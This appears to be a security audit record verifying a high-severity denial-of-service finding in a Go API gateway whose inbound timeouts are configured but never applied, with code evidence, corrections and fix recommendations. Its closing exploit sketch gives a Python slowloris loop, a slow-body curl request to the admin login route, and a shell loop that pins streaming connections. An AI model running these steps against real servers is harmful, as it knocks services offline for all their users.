verified_by: verify-dos-4 (adversarial re-audit of filed finding dos-4)

finding.title: Configured inbound timeouts are never applied to the HTTP server: no ReadHeaderTimeout/ReadTimeout/IdleTimeout/MaxHeaderBytes on any route
finding.evidence: main.go:126 is the only server construction in the repo: `srv := &http.Server{Addr: fmt.Sprintf(":%d", cfg.ListenPort), Handler: engine}` - no timeout fields at all (grep `http\.Server` over backend/ returns exactly this one hit plus main.go:134 `err := srv.ListenAndServe()`). config.go:25-26 declares `ReadTimeout time.Duration` / `WriteTimeout time.Duration` and config.go:72-73 assigns `ReadTimeout: 90 * time.Second,` / `WriteTimeout: 0, // SSE 长连接不设总写超时，由逐请求 context 控制`, but an independent grep for `cfg\.ReadTimeout|cfg\.WriteTimeout|\.ReadTimeout|\.WriteTimeout` across backend/ returns 'No matches found' - the only ReadTimeout/WriteTimeout hits anywhere are Redis client options (quota/redis_limiter.go:47-48, slb/slb.go:79-80, admin/redis_mfa.go:73). There is no SetReadDeadline/SetWriteDeadline/SetDeadline, no http.TimeoutHandler, no MaxHeaderBytes and no custom net.Listener in any non-test file (only admin/auditws_test.go:126,160 use SetReadDeadline). Consequences on the gateway path: the whole request body is read with no deadline at gateway.go:322 `body, err := io.ReadAll(io.LimitReader(c.Request.Body, 16<<20))` (and gateway.go:98 for count_tokens); the concurrency guard runs in AuthMiddleware at gateway.go:195 `if int64(snap.General.MaxConnections) > 0 && s.mx.Conns() >= int64(snap.General.MaxConnections) {` while the counter is only incremented in the handler at gateway.go:300 `s.mx.ConnInc()`, so a connection stalled in header reading is invisible to MaxConnections; and gateway.go:492-505 bounds only the upstream leg of non-stream requests, giving streams no total or idle timeout.
finding.impact: Unauthenticated connection-exhaustion outage on the only listener in the product. (a) Slowloris: nothing is ever reaped - ReadHeaderTimeout/ReadTimeout/IdleTimeout are all unset, so Go applies no header deadline and no idle deadline (IdleTimeout falls back to ReadTimeout, which is 0), keep-alive sockets never expire, and the stall happens strictly before dispatch so neither gin.Recovery, the access-log closure (main.go:106-118), nor the MaxConnections guard ever sees it. Each stalled socket costs one connection goroutine + one readLoop goroutine + a bufio.Reader plus an fd, with no application-level cap of any kind; the practical ceiling is the OS fd limit, and the attacker's cost is ~1 byte per 10 seconds per socket. (b) Slow body / slow reader: a trickle body or a client that never reads the response pins a handler goroutine indefinitely, because the relay path writes with a bare `io.WriteString` + Flush and no deadline (sse.go:234-240) and forwardStream never re-checks a deadline (gateway.go:654-718). With General.MaxConnections defaulting to 1000 (settings/settings.go:32), a small number of permanently pinned handlers drives every *other* tenant's traffic to HTTP 503 'gateway is overloaded' (gateway.go:196-199) with no path to reclaim the slots. The 'WriteTimeout=0 intentional for SSE; non-stream bounded' design fact does not hold inbound: the non-stream bound (DefaultTimeoutSeconds) is applied only to the upstream context (gateway.go:497-505), never to reading from or writing to the client. Corrections to the filed impact (they narrow, not refute, the finding): the gateway slow-body variant is NOT unauthenticated (/v1/* sits behind AuthMiddleware), the body-phase stall IS counted by Conns (ConnInc at :300 precedes the read at :322), and io.ReadAll over a LimitReader grows incrementally, so multi-GB RSS requires actually delivering the bytes - the pinned resource is the handler goroutine/fd, not a 16 MiB reservation. The unauthenticated slow-body claim does hold on a route the finding did not cite: POST /api/admin/v1/auth/login (routes.go:42, no AuthMiddleware) reads the client body via `c.ShouldBindJSON(&req)` (auth.go:29) with no deadline and no size cap at all (no MaxBytesReader anywhere in backend/).
finding.mitigations_checked: gin.Recovery (main.go:95) catches panics but does not reap stalled conns; srv.Shutdown with a 5s ctx (main.go:157-161) only drains on graceful exit and itself hangs behind stuck handlers; the listen-retry loop (main.go:130-151) rebinds but does not drain stuck conns; the per-request upstream ctx (gateway.go:496, 503, 515 `req = req.WithContext(ctx)`) bounds only the upstream read for non-stream responses; the 16 MiB LimitReader caps gateway body size but not rate; gateway.go:59 IdleConnTimeout: 90s is the *outbound* transport to providers and has no effect on inbound sockets; TRUSTED_PROXIES empty by default (config.go:74) means ClientIP is the TCP peer so per-IP mitigation is possible but nothing implements it (no per-IP connection cap anywhere); MaxConnections is gateway-only and handler-scoped, so it covers neither the header phase nor any /api/admin/v1 route; the shipped topology offers no front proxy (docker-compose.yml:10 publishes "${PORT:-8080}:8080" directly, Dockerfile:27 EXPOSE 8080; repo-wide grep for nginx / client_body_timeout / proxy_read_timeout across *.md → 0 hits), so there is no edge mitigation to lean on.
finding.recommendation: Wire the values the config already computes: `ReadHeaderTimeout: 10 * time.Second, ReadTimeout: cfg.ReadTimeout (90s), IdleTimeout: 120 * time.Second` on main.go:126 (note MaxHeaderBytes is already effectively 1<<20 via net/http's DefaultMaxHeaderBytes, so that part of the original recommendation is a no-op). Keep server-level WriteTimeout=0 for SSE but add per-write deadlines on the flush path via `http.NewResponseController(c.Writer).SetWriteDeadline(...)` refreshed on each sse.go flush, plus an absolute/idle ceiling on the stream loop (gateway.go:654) so one silent client cannot pin a handler forever. Wrap inbound body reads in a deadline (e.g. 30s per read on c.Request.Body) and add a MaxBytesReader on the admin routes, /auth/login included. Count connection reservations at accept/middleware time (before auth and before the body read) so the overload guard actually covers the phases where the pile-up happens, and add a per-source-IP connection cap.

reason:
VERDICT: CONFIRMED at high. I read backend/cmd/server/main.go, backend/internal/config/config.go, backend/internal/gateway/gateway.go, backend/internal/adapter/sse.go, backend/internal/admin/routes.go, backend/internal/admin/auth.go and backend/internal/metrics/metrics.go end-to-end. The central factual claim - inbound timeouts are configured and then never applied - is provable rather than inferred, and the header-phase attack chain has no mitigation anywhere in the flow. Only three sub-claims are overstated (they concern the body-phase variant's auth prerequisite, its accounting, and its per-connection memory), and none of them breaks the finding.

1) EVIDENCE FIDELITY (every quote verbatim, zero line drift):
- main.go:126 is literally `srv := &http.Server{Addr: fmt.Sprintf(":%d", cfg.ListenPort), Handler: engine}` with no other field; the corrected_line therefore equals the filed line 126.
- config.go:25-26 (declaration) and config.go:72-73 (`ReadTimeout: 90 * time.Second,` / `WriteTimeout: 0, // SSE 长连接不设总写超时，由逐请求 context 控制`) match verbatim.
- The dead-config claim is the strongest part and I reproduced it independently: grep `cfg\.ReadTimeout|cfg\.WriteTimeout|\.ReadTimeout|\.WriteTimeout` over backend/**/*.go → 'No matches found'. So cfg.ReadTimeout/cfg.WriteTimeout are written once in Load() and read nowhere; the 90s value has no effect. The only other ReadTimeout/WriteTimeout identifiers in the tree are go-redis client options (slb/slb.go:79-80, quota/redis_limiter.go:47-48, admin/redis_mfa.go:73), exactly as filed.
- The finding's own comment proves the intent was real and unwired: gateway.go:494 cites `这与 WriteTimeout=0（"SSE 长连接不设总写超时"）的设计一致`, describing a server property that was never set on the server.
- gateway.go:98, :195, :300-301, :492-505 and sse.go:228-240 all quoted accurately (sse.go:234-240 is `func (s *SSEWriter) raw(line string) error { _, err := io.WriteString(s.w, line); if err == nil { s.flush() }; return err }` - a raw write with no deadline and no context check).

2) WHY A DOWNSTREAM MITIGATION DOES NOT EXIST (each searched, all absent):
- One and only one http.Server in the codebase, and one ListenAndServe (main.go:134); no graceful-wrapper, no `http.TimeoutHandler`, no custom listener (`net\.Listen` → 0 hits), so no later stage could impose a deadline on inbound reads.
- Dispatch ordering makes the MaxConnections guard structurally unable to cover slowloris: routes.go:27-28 `gw := r.Group("/v1"); gw.Use(gws.AuthMiddleware())` runs the guard at gateway.go:195 only after Go has finished parsing request headers, and the gauge itself is only touched at gateway.go:300 `s.mx.ConnInc()` / :301 `defer s.mx.ConnDec()`. metrics.go:114-122 confirms `conns` is a handler-scope counter, not an accept-scope one, so header-phase sockets contribute nothing to it and are bounded by nothing at all.
- Observability claim holds: the access-log closure (main.go:106-118) emits only after `c.Next()`, so a socket that never completes its headers produces no log line - the pile-up is silent, as filed.
- Topology claim holds: the sanctioned deployment exposes the Go listener directly (docker-compose.yml:10 port publish, Dockerfile:27), and the repo contains no nginx/proxy configuration with timeouts, so there is no edge-side ReadHeaderTimeout substitute.
- Go semantics confirm the consequence: unset ReadHeaderTimeout means no deadline is applied to header reads, and IdleTimeout==0 with ReadTimeout==0 means keep-alives never expire. Slowloris and unbounded idle sockets are therefore live, unauthenticated.

3) WHERE THE FINDING OVERREACHES (recorded as corrections, not refutations):
- (i) '(b) Light-hour body attack' is filed as 'Fully unauthenticated' and cites gateway.go:322. That line is only reachable with a valid, enabled sk- key plus an IP allow-list pass (gateway.go:215-227), because AuthMiddleware aborts first. So the 16 MiB trickle variant is authenticated, not unauthenticated.
- (ii) 'a connection stalled in header/body reading is invisible to MaxConnections' is right about headers and wrong about bodies: ConnInc at :300 happens before the read at :322, so body-phase stalls are counted, and the guard (default 1000, settings.go:32) sheds new traffic at that point. The consequence is that the DoS becomes '1000 permanently pinned handlers → everyone else gets 503 forever' (still severe, and consistent with the finding's cross-reference to dos-9) rather than 'unbounded growth'.
- (iii) 'pins ... a 16 MiB ReadAll buffer for hours' overstates memory: io.ReadAll over an io.LimitReader grows the destination incrementally, so a stalled client pins only what it has actually sent (plus doubling slack); the 16 MiB cap is the mitigation working, not the vulnerability.
- (iv) Recommendation noise: 'MaxHeaderBytes: 1<<20' duplicates net/http's DefaultMaxHeaderBytes, which already applies when the field is 0, so header size is bounded today; the fields that genuinely matter are ReadHeaderTimeout/ReadTimeout/IdleTimeout.
- (v) Counter-aggravation the finding missed: the unauthenticated slow-body pile-up it wanted does exist, just elsewhere - routes.go:42 `api.POST("/auth/login", s.login)` is the one non-static route without AuthMiddleware and auth.go:29 `if err := c.ShouldBindJSON(&req); err != nil {` reads an unbounded, deadline-free body with no MaxConnections accounting whatsoever. This is why the 'unauthenticated' framing survives the correction to (i).

4) IMPACT (c) INDEPENDENTLY VERIFIED: streams get no bound at all - gateway.go:496-505 sets the DefaultTimeoutSeconds context only under `if !cr.Stream {`, and forwardStream's relay loop (gateway.go:654-718) has no deadline or idle check, so a client that advertises a window and never reads blocks sse.go's io.WriteString forever while holding a Conns slot until the handler returns. Write-side exhaustion is real and unmitigated.

5) SEVERITY: high is correct and I am not moving it. It is not critical under this audit's rubric (no unauthenticated RCE, authz bypass or data exfiltration - availability only), and it is not medium: the header-phase half is unauthenticated, uncapped, unlogged and unmitigated on the product's only listener, needs no credentials or keys, costs the attacker ~1 byte per 10s per socket, and the write-phase half lets a single leaked gateway key permanently occupy handler slots until MaxConnections=1000 refuses service to every other key. The dead `ReadTimeout: 90 * time.Second` removes any argument that this is an accepted design trade-off rather than an unwired control.
exploit_sketch:
Target: stock single-node deployment as shipped (docker-compose.yml:10 publishes 8080 straight to the host; GIN_MODE release; config.go:60 PORT default 8080). Prerequisite for Phase 1: TCP reachability to the port. Nothing else - no API key, no JWT, no account.

Phase 1 — unauthenticated slowloris against the header parser (never dispatches, so no auth, no counter, no log):
  # one socket that never finishes its request line/headers
  while True:
      s = socket.create_connection((TARGET, 8080)); s.sendall(b"POST /v1/chat/completions HTTP/1.1\r\nHost: x\r\n")
      for byte in b"X-Pad: " + b"a"*200 + b"\r\n\r\n":
          s.sendall(bytes([byte])); time.sleep(10)      # 1 byte / 10s -> Go blocks in ReadSection forever
      # after ~16 KiB of headers, send one more header every 10s and hold the socket open indefinitely
  Cost per victim socket: 1 conn goroutine + 1 readLoop goroutine + 4 KiB bufio + 1 fd, and the fd is never reclaimed (IdleTimeout==ReadTimeout==0 -> keep-alives never expire even between attacks). Scale until the process hits its fd limit; from then on `Listener.Accept` fails/parks and even GET /healthz stops answering, so the container healthcheck (docker-compose.yml:29) fails and `restart: unless-stopped` reboots into the same flood - a self-sustaining outage with no application-level cap that could have shed it (gateway.go:195 runs strictly after header parsing).

Phase 2 — unauthenticated slow body on the admin plane (no deadline, no size cap, no accounting):
  # Content-Length claims 64 MiB; trickle it at 1 byte/s over N sockets
  curl -X POST http://TARGET:8080/api/admin/v1/auth/login -H 'Content-Type: application/json' \
       -H 'Transfer-Encoding: chunked' --data-binary @<(/dev/zero slow generator)
  Reaches auth.go:29 `c.ShouldBindJSON(&req)`; gin reads c.Request.Body unbounded with no deadline. These sockets are outside MaxConnections entirely (that guard lives only in the gateway AuthMiddleware), so they pile up without limit and without a 503 back-pressure signal.

Phase 3 — one valid gateway key pins the whole data plane (needs a single legitimate or leaked sk- key, i.e. what a routed tenant already has):
  for i in $(seq 1 1200); do
    curl -N -s http://TARGET:8080/v1/chat/completions -H "Authorization: Bearer ***" \
         -H 'Content-Type: application/json' \
         -d '{"model":"<configured-alias>","stream":true,"messages":[{"role":"user","content":"hi"}]}' \
         --output /dev/null &   # client that reads nothing after the response headers
  done
  Each request passes gateway.go:195 (Conns < 1000), does ConnInc (:300), enters forwardStream, and blocks forever in sse.go:235 io.WriteString once its TCP receive window closes - no WriteTimeout exists and no per-write deadline is set. Once Conns saturates at 1000, every legitimate key receives HTTP 503 'gateway is overloaded' (gateway.go:196-199) indefinitely; killing the clients is the only recovery, and there is no server-side reaper, idle timer or per-IP cap to fall back on. Trickle the request body instead (same sockets, no upstream needed at all) to reproduce the cheaper variant of Phase 3.
